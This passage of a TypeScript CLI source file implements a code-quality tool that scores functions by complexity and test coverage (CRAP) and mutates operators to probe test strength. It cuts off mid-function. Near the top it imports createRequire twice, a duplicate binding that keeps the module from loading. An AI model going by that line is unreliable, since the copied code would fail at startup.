#!/usr/bin/env node
// `dev-loop quality` — the CRAP gate + mutation probe (the quality-gauntlet design,
// docs/design/quality-gauntlet.md; modeled on unclebob/crap4java).
//
// CRAP(fn) = CC² × (1 − coverage)³ + CC — per FUNCTION, not per file: it scores the
// intersection of "complex" AND "untested", which is exactly the failure shape of
// agent-written code (clever logic nobody's tests exercise). Complexity alone flags
// well-tested hot spots; coverage alone flags trivial glue; the product flags risk.
//
// Two modes, one tool:
//   report/gate   run the repo's tests under NODE_V8_COVERAGE (TS/JS) and/or
//                 \`go test -coverprofile\` (Go), map coverage onto source functions,
//                 print the worst-first CRAP table; --threshold N turns the report
//                 into a GATE (exit 2 when exceeded). Language is per FILE (extension),
//                 so a mixed repo gets one unified report on one formula.
//   --mutate      the test-strength probe: flip one operator/literal per sampled
//                 function, re-run the tests, restore the file byte-identically. A
//                 SURVIVING mutant = a test suite that doesn't bite (the 2026-07 field
//                 incident: all-null prices shipped under a fully GREEN suite —
//                 coverage can't catch that; a mutant survives it loudly).
//
// Deliberately dependency-free: complexity/function spans come from the TARGET repo's
// own `typescript` package when resolvable (real AST), else a per-FILE token fallback
// (degraded but honest — rows say file-level). Coverage is native V8 (NODE_V8_COVERAGE)
// — no jacoco/c8/istanbul. On Node's zero-build type-stripping, TS offsets are
// PRESERVED in the running file, so V8 ranges map 1:1 onto the .ts source.
//
// Exit codes: 0 ok · 1 usage/internal · 2 CRAP threshold exceeded · 3 surviving mutants
// (with --fail-on-survivors). Machine consumption: --json.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync, spawnSync } from "node:child_process";
import { createRequire } from "node:module";
import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, relative, resolve } from "node:path";
import { createHash } from "node:crypto";
import { isMainEntry } from "./is-entry.ts";

// ─── types ───────────────────────────────────────────────────────────────────────────────────────

interface FnSpan { name: string; file: string; start: number; end: number; line: number; cc: number }
interface Row extends FnSpan { coverage: number | null; crap: number | null }
interface Mutant { file: string; line: number; from: string; to: string; fn: string; killed: boolean | null; note?: string }

interface Opts {
  paths: string[];
  changed: boolean;
  diffBase: string | null;
  threshold: number | null;
  json: boolean;
  testCmd: string | null;
  coverageDir: string | null;
  keepCoverage: boolean;
  mutate: boolean;
  sample: number;
  failOnSurvivors: boolean;
  mutateTestCmd: string | null;
  goTestCmd: string | null;
  top: number;
}

// ─── CLI ─────────────────────────────────────────────────────────────────────────────────────────

function usage(): void {
  console.log(`dev-loop quality — per-function CRAP report/gate + mutation probe (CRAP = CC² × (1−cov)³ + CC)

Usage:
  dev-loop quality                     analyze every source file under src/
  dev-loop quality --changed           analyze files changed per \`git status\` (the cheap per-fire gate)
  dev-loop quality --diff-base <ref>   analyze files changed vs a ref (\`git diff ref...HEAD\` — the PR
                                       gate: CI checkouts are clean, so --changed sees nothing there)
  dev-loop quality <path ...>          analyze these files / directories
  dev-loop quality --mutate            + mutation probe on the worst-CRAP functions

Options:
  --threshold <n>       GATE: exit 2 when the max CRAP score exceeds n (absent = report-only)
  --test-cmd <cmd>      coverage/test command (default: \`npm test\`), run with NODE_V8_COVERAGE
  --coverage-dir <dir>  reuse an existing NODE_V8_COVERAGE dir instead of running tests
  --keep-coverage       keep the collected coverage dir (prints its path)
  --top <n>             show only the worst n rows (default 25; 0 = all)
  --json                machine output: { rows, mutants, maxCrap }
  --mutate              mutation probe: flip one operator/literal per sampled function,
                        re-run tests, restore byte-identically; SURVIVED = a test gap
  --sample <n>          how many worst-CRAP functions to mutate (default 5)
  --mutate-test-cmd <c> test command for mutants (default: --test-cmd / npm test; go files: \`go test ./...\`)
  --go-test-cmd <c>     Go coverage command; "{profile}" is replaced with the coverprofile path
                        (default: \`go test -count=1 -coverpkg=./... -coverprofile={profile} ./...\`)
  --fail-on-survivors   exit 3 when any mutant survives

Config hook: \`repos.<ref>.build.quality\` (e.g. "dev-loop quality --changed --threshold 30")
runs as the fourth Step-5 ship gate after typecheck/build/test (conventions §19).`);
}

function die(msg: string, code = 1): never { console.error(`dev-loop quality: ${msg}`); process.exit(code); }

function parseArgs(argv: string[]): Opts {
  const o: Opts = { paths: [], changed: false, diffBase: null, threshold: null, json: false, testCmd: null, coverageDir: null,
    keepCoverage: false, mutate: false, sample: 5, failOnSurvivors: false, mutateTestCmd: null, goTestCmd: null, top: 25 };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    const next = () => argv[++i] ?? die(`${a} requires a value`);
    if (a === "--help" || a === "-h") { usage(); process.exit(0); }
    else if (a === "--changed") o.changed = true;
    else if (a === "--diff-base") o.diffBase = next();
    else if (a === "--threshold") { o.threshold = Number(next()); if (!Number.isFinite(o.threshold)) die("--threshold must be a number"); }
    else if (a === "--json") o.json = true;
    else if (a === "--test-cmd") o.testCmd = next();
    else if (a === "--coverage-dir") o.coverageDir = resolve(next());
    else if (a === "--keep-coverage") o.keepCoverage = true;
    else if (a === "--mutate") o.mutate = true;
    else if (a === "--sample") { o.sample = Number(next()); if (!Number.isInteger(o.sample) || o.sample <= 0) die("--sample must be a positive integer"); }
    else if (a === "--fail-on-survivors") o.failOnSurvivors = true;
    else if (a === "--mutate-test-cmd") o.mutateTestCmd = next();
    else if (a === "--go-test-cmd") o.goTestCmd = next();
    else if (a === "--top") { o.top = Number(next()); if (!Number.isInteger(o.top) || o.top < 0) die("--top must be a non-negative integer"); }
    else if (a.startsWith("--")) die(`unknown option '${a}'`);
    else o.paths.push(a);
  }
  return o;
}

// ─── file selection (crap4java §5: default src/**, --changed via git status, explicit paths) ─────

const SRC_EXT = /\.(ts|tsx|mts|cts|js|mjs|cjs|jsx|go)$/;
const SKIP_DIRS = new Set(["node_modules", "dist", "build", "coverage", ".git", ".next", "vendor"]);
const isTestFile = (p: string) => /(\.test\.|\.spec\.|_test\.go$|__tests__|(^|\/)tests?\/)/.test(p);

function walk(dir: string, out: string[]): void {
  let entries: string[] = [];
  try { entries = readdirSync(dir); } catch { return; }
  for (const e of entries) {
    if (SKIP_DIRS.has(e)) continue;
    const p = join(dir, e);
    let st; try { st = statSync(p); } catch { continue; }
    if (st.isDirectory()) walk(p, out);
    else if (SRC_EXT.test(e) && !e.endsWith(".d.ts")) out.push(p);
  }
}

function selectFiles(root: string, o: Opts): string[] {
  const out: string[] = [];
  if (o.diffBase) {
    // The PR gate: everything that changed vs the base ref (three-dot = merge-base semantics, the
    // same set the PR view shows). Deleted files drop out via the existsSync filter.
    const diff = execFileSync("git", ["diff", "--name-only", `${o.diffBase}...HEAD`], { cwd: root, encoding: "utf8" });
    for (const p of diff.split("\n").map((l) => l.trim())) {
      if (p && SRC_EXT.test(p) && !p.endsWith(".d.ts") && !isTestFile(p) && existsSync(join(root, p))) out.push(resolve(root, p));
    }
  } else if (o.changed) {
    const st = execFileSync("git", ["status", "--porcelain"], { cwd: root, encoding: "utf8" });
    for (const line of st.split("\n")) {
      const p = line.slice(3).trim();
      if (p && SRC_EXT.test(p) && !p.endsWith(".d.ts") && !isTestFile(p) && existsSync(join(root, p))) out.push(resolve(root, p));
    }
  } else if (o.paths.length) {
    for (const raw of o.paths) {
      const p = resolve(root, raw);
      if (!existsSync(p)) die(`no such path: ${raw}`);
      if (statSync(p).isDirectory()) { const sub = join(p, "src"); walk(existsSync(sub) ? sub : p, out); }
      else out.push(p);
    }
  } else {
    const src = join(root, "src");
    walk(existsSync(src) ? src : root, out);
  }
  return [...new Set(out)].filter((p) => !isTestFile(relative(root, p))).sort();
}

// ─── complexity: real AST via the target repo's own `typescript`, else per-file token fallback ───

// Loaded once; null ⇒ fallback mode. The TARGET repo's typescript wins (its parser matches its
// syntax level); our own devDependency is the second chance (covers plain-JS repos).
type TsModule = typeof import("typescript");
function loadTypescript(root: string): TsModule | null {
  for (const from of [join(root, "package.json"), join(import.meta.dirname ?? ".", "package.json")]) {
    try { return createRequire(from)("typescript") as TsModule; } catch { /* next candidate */ }
  }
  return null;
}

// The decision points crap4java counts (if / loops / case / catch / ternary / && / ||) plus `??`.
function isDecisionNode(ts: TsModule, n: import("typescript").Node): boolean {
  const K = ts.SyntaxKind;
  switch (n.kind) {
    case K.IfStatement: case K.ForStatement: case K.ForInStatement: case K.ForOfStatement:
    case K.WhileStatement: case K.DoStatement: case K.CaseClause: case K.CatchClause:
    case K.ConditionalExpression: return true;
    case K.BinaryExpression: {
      const op = (n as import("typescript").BinaryExpression).operatorToken.kind;
      return op === K.AmpersandAmpersandToken || op === K.BarBarToken || op === K.QuestionQuestionToken;
    }
    default: return false;
  }
}

function isFunctionNode(ts: TsModule, n: import("typescript").Node): boolean {
  const K = ts.SyntaxKind;
  return n.kind === K.FunctionDeclaration || n.kind === K.MethodDeclaration || n.kind === K.Constructor
    || n.kind === K.GetAccessor || n.kind === K.SetAccessor || n.kind === K.FunctionExpression || n.kind === K.ArrowFunction;
}

// Complexity of ONE function body: nested function-likes are their own rows, so the walk
// does not descend into them (the classic per-method reading of cyclomatic complexity).
function ccOf(ts: TsModule, fn: import("typescript").Node): number {
  let cc = 1;
  const visit = (n: import("typescript").Node): void => {
    if (n !== fn && isFunctionNode(ts, n)) return;
    if (isDecisionNode(ts, n)) cc++;
    ts.forEachChild(n, visit);
  };
  ts.forEachChild(fn, visit);
  return cc;
}

function fnName(ts: TsModule, n: import("typescript").Node, sf: import("typescript").SourceFile): string {
  const K = ts.SyntaxKind;
  const own = (n as { name?: import("typescript").Node }).name;
  let base = own ? own.getText(sf) : "";
  if (!base) {
    // Anonymous function/arrow: borrow the nearest assignment target so the report row is findable.
    const p = n.parent as import("typescript").Node | undefined;
    if (p && (p.kind === K.VariableDeclaration || p.kind === K.PropertyAssignment || p.kind === K.PropertyDeclaration))
      base = (p as { name?: import("typescript").Node }).name?.getText(sf) ?? "";
    else if (p && p.kind === K.BinaryExpression) base = (p as import("typescript").BinaryExpression).left.getText(sf);
  }
  if (!base) base = n.kind === K.Constructor ? "constructor" : "<anon>";
  // Class context prefix, crap4java-style Method@Class readability.
  let cls = "";
  for (let a = n.parent; a; a = a.parent) {
    if (a.kind === K.ClassDeclaration || a.kind === K.ClassExpression) { cls = (a as { name?: import("typescript").Node }).name?.getText(sf) ?? ""; break; }
  }
  return cls ? `${cls}.${base}` : base;
}

function parseFunctions(ts: TsModule | null, root: string, file: string, source: string): FnSpan[] {
  const rel = relative(root, file);
  if (!ts) {
    // Fallback (no typescript resolvable): one file-level row — degraded but honest.
    let cc = 1;
    const stripped = source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/[^\n]*/g, "");
    for (const m of stripped.matchAll(/\b(if|for|while|case|catch)\b|\&\&|\|\||\?\?/g)) { void m; cc++; }
    return [{ name: "<file>", file: rel, start: 0, end: source.length, line: 1, cc }];
  }
  const sf = ts.createSourceFile(file, source, ts.ScriptTarget.Latest, true);
  const out: FnSpan[] = [];
  const visit = (n: import("typescript").Node): void => {
    if (isFunctionNode(ts, n) && (n as { body?: unknown }).body) {
      const start = n.getStart(sf);
      out.push({ name: fnName(ts, n, sf), file: rel, start, end: n.getEnd(),
        line: sf.getLineAndCharacterOfPosition(start).line + 1, cc: ccOf(ts, n) });
    }
    ts.forEachChild(n, visit);
  };
  visit(sf);
  return out;
}

// ─── Go backend ──────────────────────────────────────────────────────────────────────────────────
// Same formula, same report, same gate — a second language backend picked per FILE extension.
// Complexity: a token-level scan over comment/string-stripped source (Go's grammar is regular
// enough — every function starts with \`func\` at brace-depth 0 — that a real AST buys little here;
// function literals/closures count toward their host function, unlike the TS backend's own-row
// treatment). Coverage: \`go test -coverprofile\` — BLOCK-level with line.col ranges and hit counts,
// an even cleaner source than V8. Claimed-byte semantics: the profile only covers statement blocks,
// so a function's denominator is its CLAIMED bytes (signature/braces don't dilute the score).

// Blank out comments and string/rune literals, preserving byte offsets (same trick the type
// stripper uses): positions found on the stripped text apply 1:1 to the original.
// Helpers keep the CC of each scan loop small; the dispatcher (stripGo) is the call site.
function blankLineComment(out: string[], src: string, i: number, n: number): number {
  while (i < n && src[i] !== "\n") { out[i] = " "; i++; }
  return i;
}
function blankBlockComment(out: string[], src: string, i: number, n: number): number {
  out[i] = out[i + 1] = " "; i += 2;
  while (i < n && !(src[i] === "*" && src[i + 1] === "/")) { if (src[i] !== "\n") out[i] = " "; i++; }
  if (i < n) { out[i] = out[i + 1] = " "; i += 2; }
  return i;
}
function blankQuoted(out: string[], src: string, i: number, n: number, q: string): number {
  out[i] = " "; i++;
  while (i < n && src[i] !== q) {
    if (src[i] === "\\") { out[i] = " "; i++; }
    if (i < n && src[i] !== "\n") out[i] = " ";
    i++;
  }
  if (i < n) { out[i] = " "; i++; }
  return i;
}
function blankBacktick(out: string[], src: string, i: number, n: number): number {
  out[i] = " "; i++;
  while (i < n && src[i] !== "\`") { if (src[i] !== "\n") out[i] = " "; i++; }
  if (i < n) { out[i] = " "; i++; }
  return i;
}
export function stripGo(src: string): string {
  const out = src.split("");
  let i = 0;
  const n = src.length;
  while (i < n) {
    const c = src[i];
    if (c === "/" && src[i + 1] === "/") { i = blankLineComment(out, src, i, n); continue; }
    if (c === "/" && src[i + 1] === "*") { i = blankBlockComment(out, src, i, n); continue; }
    if (c === '"' || c === "'") { i = blankQuoted(out, src, i, n, c); continue; }
    if (c === "\`") { i = blankBacktick(out, src, i, n); continue; }
    i++;
  }
  return out.join("");
}

function goCcOf(body: string): number {
  let cc = 1;
  for (const m of body.matchAll(/\b(if|for|case)\b|&&|\|\|/g)) { void m; cc++; }
  return cc;
}

function parseGoFunctions(root: string, file: string, source: string): FnSpan[] {
  const rel = relative(root, file);
  const stripped = stripGo(source);
  const out: FnSpan[] = [];
  const re = /(^|\n)func(\s*\(([^)]*)\))?\s+([A-Za-z_][A-Za-z0-9_]*)/g;
  for (const m of stripped.matchAll(re)) {
    const start = m.index! + m[1].length;
    const receiver = m[3];
    let name = m[4];
    if (receiver) {
      const t = receiver.trim().split(/\s+/).pop()?.replace(/[*\[\]]/g, "") ?? "";
      if (t) name = `${t}.${name}`;
    }
    // Find the body: the first '{' at paren-depth 0 after the signature start (a struct{} return
    // type can fool this — accepted, rare); then match braces to the function's end.
    let i = m.index! + m[0].length;
    let paren = 0;
    while (i < stripped.length && !(stripped[i] === "{" && paren === 0)) {
      if (stripped[i] === "(" || stripped[i] === "[") paren++;
      else if (stripped[i] === ")" || stripped[i] === "]") paren--;
      i++;
    }
    if (i >= stripped.length) continue; // declaration without a body (assembly stub) — skip
    let depth = 0;
    let j = i;
    for (; j < stripped.length; j++) {
      if (stripped[j] === "{") depth++;
      else if (stripped[j] === "}") { depth--; if (depth === 0) { j++; break; } }
    }
    out.push({ name, file: rel, start, end: j, line: source.slice(0, start).split("\n").length,
      cc: goCcOf(stripped.slice(i, j)) });
  }
  return out;
}

// Run \`go test -coverprofile\` and paint per-file covered/claimed byte maps from the block ranges.
function collectGoCoverage(root: string, wanted: Map<string, string>, goTestCmd: string | null):
  { painted: Map<string, Uint8Array>; claimed: Map<string, Uint8Array> } {
  const painted = new Map<string, Uint8Array>();
  const claimed = new Map<string, Uint8Array>();
  let moduleName = "";
  try { moduleName = (readFileSync(join(root, "go.mod"), "utf8").match(/^module\s+(\S+)/m)?.[1]) ?? ""; }
  catch { console.error("quality: no go.mod at the root — Go coverage skipped (rows go N/A)"); return { painted, claimed }; }
  const profile = join(mkdtempSync(join(tmpdir(), "devloop-quality-go-")), "cover.out");
  const cmd = goTestCmd ? goTestCmd.replaceAll("{profile}", profile)
    : `go test -count=1 -coverpkg=./... -coverprofile=${JSON.stringify(profile)} ./...`;
  console.error(`quality: running Go tests for coverage — ${cmd}`);
  const r = spawnSync("bash", ["-c", cmd], { cwd: root, stdio: ["ignore", "pipe", "pipe"], encoding: "utf8", env: process.env });
  if (r.stdout) process.stderr.write(r.stdout);
  if (r.stderr) process.stderr.write(r.stderr);
  if (r.status !== 0) console.error(`quality: go test exited ${r.status ?? "?"} — coverage may be partial (rows still computed)`);
  let prof = "";
  try { prof = readFileSync(profile, "utf8"); } catch { console.error("quality: no coverprofile produced — Go rows go N/A"); return { painted, claimed }; }
  // line format: <module>/<rel>.go:<sl>.<sc>,<el>.<ec> <numStmt> <count>
  const lineStartsCache = new Map<string, number[]>();
  const lineStarts = (src: string): number[] => {
    const st = [0];
    for (let i = 0; i < src.length; i++) if (src[i] === "\n") st.push(i + 1);
    return st;
  };
  for (const line of prof.split("\n")) {
    const m = line.match(/^(.*\.go):(\d+)\.(\d+),(\d+)\.(\d+)\s+\d+\s+(\d+)$/);
    if (!m) continue;
    let p = m[1];
    if (moduleName && p.startsWith(moduleName + "/")) p = p.slice(moduleName.length + 1);
    const abs = resolve(root, p);
    const src = wanted.get(abs);
    if (src === undefined) continue;
    let st = lineStartsCache.get(abs);
    if (!st) { st = lineStarts(src); lineStartsCache.set(abs, st); }
    const s0 = (st[Number(m[2]) - 1] ?? src.length) + Number(m[3]) - 1;
    const e0 = (st[Number(m[4]) - 1] ?? src.length) + Number(m[5]) - 1;
    const hit = Number(m[6]) > 0 ? 1 : 0;
    const paint = painted.get(abs) ?? (() => { const a = new Uint8Array(src.length); painted.set(abs, a); return a; })();
    const claim = claimed.get(abs) ?? (() => { const a = new Uint8Array(src.length); claimed.set(abs, a); return a; })();
    const s1 = Math.min(Math.max(s0, 0), src.length), e1 = Math.min(Math.max(e0, 0), src.length);
    for (let i = s1; i < e1; i++) { claim[i] = 1; if (hit) paint[i] = 1; } // OR across packages (coverpkg re-lists blocks)
  }
  return { painted, claimed };
}

// One flip inside a Go function span, comment/string-aware (positions from the stripped text apply
// to the original — stripGo preserves offsets). \`<-\` (channel), \`++\`/\`--\` are never mutated.
function findGoMutationSite(source: string, span: FnSpan): { pos: number; from: string; to: string } | null {
  const t = stripGo(source);
  const TWO: Record<string, string> = { "==": "!=", "!=": "==", "<=": "<", ">=": ">", "&&": "||", "||": "&&" };
  for (let i = span.start; i < span.end - 1; i++) {
    const two = t.slice(i, i + 2);
    if (TWO[two]) return { pos: i, from: two, to: TWO[two] };
    const c = t[i];
    if (c === "<" && two !== "<-" && two !== "<<" && two !== "<=") return { pos: i, from: "<", to: "<=" };
    if (c === ">" && two !== ">>" && two !== ">=") return { pos: i, from: ">", to: ">=" };
  }
  const word = /\b(true|false)\b/g;
  word.lastIndex = span.start;
  const w = word.exec(t);
  if (w && w.index < span.end) return { pos: w.index, from: w[1], to: w[1] === "true" ? "false" : "true" };
  return null;
}

// ─── coverage: native V8 (NODE_V8_COVERAGE), painted per file, OR-merged across processes ────────

function runTests(root: string, cmd: string, covDir: string): void {
  console.error(`quality: running tests for coverage — ${cmd}  (NODE_V8_COVERAGE=${covDir})`);
  // Test output rides STDERR: stdout belongs to the report (--json consumers parse it — a TAP line
  // leaking into stdout would corrupt the machine output).
  const r = spawnSync("bash", ["-c", cmd], { cwd: root, stdio: ["ignore", "pipe", "pipe"], encoding: "utf8",
    env: { ...process.env, NODE_V8_COVERAGE: covDir } });
  if (r.stdout) process.stderr.write(r.stdout);
  if (r.stderr) process.stderr.write(r.stderr);
  if (r.status !== 0) console.error(`quality: test command exited ${r.status ?? "?"} — coverage may be partial (rows still computed)`);
}

// covered[file] = Uint8Array over source length; 1 = executed at least once in some process.
// Per process, ranges are painted outer-first (sorted start asc / end desc) so nested
// uncovered branches override their covered parents; processes then OR together —
// covered anywhere is covered (a worker that never loaded the file must not erase another's data).
function collectCoverage(root: string, covDir: string, wanted: Map<string, string>): Map<string, Uint8Array> {
  const merged = new Map<string, Uint8Array>();
  let files: string[] = [];
  try { files = readdirSync(covDir).filter((f) => f.startsWith("coverage-") && f.endsWith(".json")); } catch { return merged; }
  for (const f of files) {
    let data: { result?: { url?: string; functions?: { ranges?: { startOffset: number; endOffset: number; count: number }[] }[] }[] };
    try { data = JSON.parse(readFileSync(join(covDir, f), "utf8")); } catch { continue; }
    const perProc = new Map<string, Uint8Array>();
    for (const script of data.result ?? []) {
      if (!script.url?.startsWith("file://")) continue;
      let p: string; try { p = decodeURIComponent(new URL(script.url).pathname); } catch { continue; }
      const src = wanted.get(p);
      if (src === undefined) continue;
      const paint = perProc.get(p) ?? new Uint8Array(src.length);
      const ranges = (script.functions ?? []).flatMap((fn) => fn.ranges ?? []);
      ranges.sort((a, b) => a.startOffset - b.startOffset || b.endOffset - a.endOffset);
      for (const r of ranges) {
        const s = Math.min(Math.max(r.startOffset, 0), src.length);
        const e = Math.min(Math.max(r.endOffset, 0), src.length);
        paint.fill(r.count > 0 ? 1 : 0, s, e);
      }
      perProc.set(p, paint);
    }
    for (const [p, paint] of perProc) {
      const m = merged.get(p);
      if (!m) merged.set(p, paint);
      else for (let i = 0; i < paint.length; i++) if (paint[i]) m[i] = 1;
    }
  }
  void root;
  return merged;
}

function coverageOf(paint: Uint8Array | undefined, claimed: Uint8Array | undefined, start: number, end: number): number | null {
  if (!paint || end <= start) return paint ? 100 : null;
  // With a claimed map (Go: the profile covers statement BLOCKS only), the denominator is the
  // span's claimed bytes — signatures/braces must not dilute the score. No claimed map (V8: the
  // whole loaded script is claimed) keeps the full-span denominator.
  if (claimed) {
    let hit = 0, claim = 0;
    for (let i = start; i < end && i < paint.length; i++) { if (claimed[i]) { claim++; hit += paint[i]; } }
    return claim === 0 ? null : (hit / claim) * 100; // a span with no claimed bytes has no measurable statements
  }
  let hit = 0;
  for (let i = start; i < end && i < paint.length; i++) hit += paint[i];
  return (hit / (end - start)) * 100;
}

// CRAP = CC² × (1 − cov)³ + CC (crap4java formula, coverage as a fraction).
function crapScore(cc: number, coveragePct: number | null): number | null {
  if (coveragePct === null) return null;
  const un = 1 - coveragePct / 100;
  return cc * cc * un * un * un + cc;
}

// ─── report (crap4java shape: worst first, N/A at the bottom) ────────────────────────────────────

function formatReport(rows: Row[], top: number): string {
  const shown = top > 0 ? rows.slice(0, top) : rows;
  const w = { fn: 34, file: 40 };
  const clip = (s: string, n: number) => s.length <= n ? s : `…${s.slice(-(n - 1))}`;
  const lines: string[] = ["CRAP Report", "==========="];
  lines.push(`${"Function".padEnd(w.fn)} ${"File:Line".padEnd(w.file)} ${"CC".padStart(4)} ${"Cov%".padStart(7)} ${"CRAP".padStart(8)}`);
  lines.push("-".repeat(w.fn + w.file + 22));
  for (const r of shown)
    lines.push(`${clip(r.name, w.fn).padEnd(w.fn)} ${clip(`${r.file}:${r.line}`, w.file).padEnd(w.file)} ${String(r.cc).padStart(4)} ${(r.coverage === null ? "N/A" : r.coverage.toFixed(1)).padStart(7)} ${(r.crap === null ? "N/A" : r.crap.toFixed(1)).padStart(8)}`);
  if (top > 0 && rows.length > top) lines.push(`… ${rows.length - top} more row(s) (--top 0 for all)`);
  return lines.join("\n");
}

// ─── mutation probe ──────────────────────────────────────────────────────────────────────────────

// One flip per site, deterministic order: the first mutable token inside the function span.
const OP_FLIPS: Record<string, string> = { "===": "!==", "!==": "===", "==": "!=", "!=": "==",
  "<": "<=", "<=": "<", ">": ">=", ">=": ">", "&&": "||", "||": "&&", "+": "-", "-": "+" };

function findMutationSite(ts: TsModule, source: string, file: string, span: FnSpan): { pos: number; from: string; to: string } | null {
  const sf = ts.createSourceFile(file, source, ts.ScriptTarget.Latest, true);
  const K = ts.SyntaxKind;
  let found: { pos: number; from: string; to: string } | null = null;
  const visit = (n: import("typescript").Node): void => {
    if (found) return;
    const s = n.getStart(sf);
    if (s < span.start || n.getEnd() > span.end) { if (n.getEnd() < span.start || s > span.end) return; }
    if (n.kind === K.BinaryExpression) {
      const opTok = (n as import("typescript").BinaryExpression).operatorToken;
      const op = opTok.getText(sf);
      const flip = OP_FLIPS[op];
      // `+` on strings concatenates — flipping to `-` yields NaN, still a behavior change; allowed.
      if (flip && opTok.getStart(sf) >= span.start && opTok.getEnd() <= span.end) { found = { pos: opTok.getStart(sf), from: op, to: flip }; return; }
    }
    if ((n.kind === K.TrueKeyword || n.kind === K.FalseKeyword) && s >= span.start) {
      found = { pos: s, from: n.getText(sf), to: n.kind === K.TrueKeyword ? "false" : "true" }; return;
    }
    ts.forEachChild(n, visit);
  };
  visit(sf);
  return found;
}

const sha = (s: string) => createHash("sha256").update(s).digest("hex");

function runMutation(ts: TsModule | null, root: string, rows: Row[], o: Opts): Mutant[] {
  const pool = rows.filter((r) => r.name !== "<file>").slice(0, o.sample);
  const testCmdFor = (row: Row): string => row.file.endsWith(".go")
    ? (o.mutateTestCmd ?? "go test -count=1 ./...")
    : (o.mutateTestCmd ?? o.testCmd ?? "npm test");
  const mutants: Mutant[] = [];
  const restores: { path: string; bytes: string }[] = [];
  const restoreAll = () => { for (const r of restores.splice(0)) { try { writeFileSync(r.path, r.bytes); } catch { console.error(`quality: FAILED to restore ${r.path} — original saved at ${r.path}.quality-orig`); try { writeFileSync(`${r.path}.quality-orig`, r.bytes); } catch { /* double fault */ } } } };
  process.on("SIGINT", () => { restoreAll(); process.exit(130); });
  process.on("uncaughtException", (e) => { restoreAll(); console.error(e); process.exit(1); });

  for (const row of pool) {
    const abs = resolve(root, row.file);
    // Mutating a file the operator/agent is mid-edit on would merge our flip into THEIR change — refuse.
    // Outside a git repo there is nothing to protect against (and nothing to restore FROM) — proceed;
    // the byte-identical restore + sha verification below is the real safety net either way.
    let dirty = "";
    try { dirty = execFileSync("git", ["status", "--porcelain", "--", row.file], { cwd: root, encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).trim(); } catch { /* not a git repo */ }
    if (dirty) { mutants.push({ file: row.file, line: row.line, from: "", to: "", fn: row.name, killed: null, note: "skipped: file has uncommitted changes" }); continue; }
    const source = readFileSync(abs, "utf8");
    const site = row.file.endsWith(".go") ? findGoMutationSite(source, { ...row, start: row.start, end: row.end })
      : ts ? findMutationSite(ts, source, abs, row) : null;
    if (!site) { mutants.push({ file: row.file, line: row.line, from: "", to: "", fn: row.name, killed: null, note: "skipped: no mutable operator/literal in span" }); continue; }
    const before = sha(source);
    const mutated = source.slice(0, site.pos) + site.to + source.slice(site.pos + site.from.length);
    restores.push({ path: abs, bytes: source });
    writeFileSync(abs, mutated);
    console.error(`quality: mutant ${row.file}:${row.line} ${row.name}  ${site.from} → ${site.to}  … running tests`);
    const r = spawnSync("bash", ["-c", testCmdFor(row)], { cwd: root, stdio: ["ignore", "pipe", "pipe"], env: { ...process.env }, encoding: "utf8" });
    writeFileSync(abs, source);
    restores.pop();
    if (sha(readFileSync(abs, "utf8")) !== before) die(`restore verification FAILED for ${row.file} — check the working tree`, 1);
    const killed = r.status !== 0;
    mutants.push({ file: row.file, line: row.line, from: site.from, to: site.to, fn: row.name, killed });
    console.error(`quality:   ${killed ? "KILLED (a test caught it)" : "SURVIVED — no test noticed this behavior change"}`);
  }
  return mutants;
}

// ─── main ────────────────────────────────────────────────────────────────────────────────────────

function main(): void {
  const o = parseArgs(process.argv.slice(2));
  const root = process.cwd();
  const files = selectFiles(root, o);
  if (!files.length) { console.log("No source files to analyze."); return; }

  const goFiles = files.filter((f) => f.endsWith(".go"));
  const tsjsFiles = files.filter((f) => !f.endsWith(".go"));
  const ts = tsjsFiles.length ? loadTypescript(root) : null;
  if (tsjsFiles.length && !ts) console.error("quality: no `typescript` resolvable (repo or dev-loop) — falling back to per-FILE complexity rows");

  const sources = new Map<string, string>();
  for (const f of files) sources.set(f, readFileSync(f, "utf8"));
  const tsjsSources = new Map([...sources].filter(([f]) => !f.endsWith(".go")));
  const goSources = new Map([...sources].filter(([f]) => f.endsWith(".go")));

  // coverage — per language pipeline, one merged row set
  let covDir = o.coverageDir;
  let ephemeral = false;
  const painted = new Map<string, Uint8Array>();
  const claimed = new Map<string, Uint8Array>(); // Go only — V8 claims the whole loaded script
  if (tsjsFiles.length) {
    if (!covDir) {
      covDir = mkdtempSync(join(tmpdir(), "devloop-quality-"));
      ephemeral = true;
      runTests(root, o.testCmd ?? "npm test", covDir);
    }
    for (const [f, p] of collectCoverage(root, covDir, tsjsSources)) painted.set(f, p);
    if (![...painted.keys()].some((f) => !f.endsWith(".go")))
      console.error(`quality: no V8 coverage matched the analyzed TS/JS files (dir: ${covDir}) — those rows go N/A. If tests run COMPILED output (dist/), point paths at what actually runs, or run tests directly on source (zero-build).`);
  }
  if (goFiles.length) {
    const g = collectGoCoverage(root, goSources, o.goTestCmd);
    for (const [f, p] of g.painted) painted.set(f, p);
    for (const [f, c] of g.claimed) claimed.set(f, c);
  }

  // rows
  const rows: Row[] = [];
  for (const f of files) {
    const src = sources.get(f)!;
    const paint = painted.get(f);
    const spans = f.endsWith(".go") ? parseGoFunctions(root, f, src) : parseFunctions(ts, root, f, src);
    for (const span of spans) {
      const cov = coverageOf(paint, claimed.get(f), span.start, span.end);
      rows.push({ ...span, coverage: cov, crap: crapScore(span.cc, cov) });
    }
  }
  rows.sort((a, b) => (a.crap === null ? 1 : 0) - (b.crap === null ? 1 : 0) || (b.crap ?? 0) - (a.crap ?? 0) || b.cc - a.cc);
  const maxCrap = rows.find((r) => r.crap !== null)?.crap ?? null;

  // mutation probe
  let mutants: Mutant[] = [];
  if (o.mutate) {
    if (rows.some((r) => !r.file.endsWith(".go")) && !ts)
      die("--mutate on TS/JS needs a resolvable `typescript` (AST-precise flips only — no blind regex edits)");
    mutants = runMutation(ts, root, rows, o);
  }

  if (ephemeral && !o.keepCoverage) { try { rmSync(covDir!, { recursive: true, force: true }); } catch { /* tmp */ } }
  else if (o.keepCoverage) console.error(`quality: coverage kept at ${covDir}`);

  // output
  if (o.json) {
    console.log(JSON.stringify({ maxCrap, rows, mutants }, null, 2));
  } else {
    console.log(formatReport(rows, o.top));
    if (mutants.length) {
      console.log("\nMutation Probe\n==============");
      for (const m of mutants)
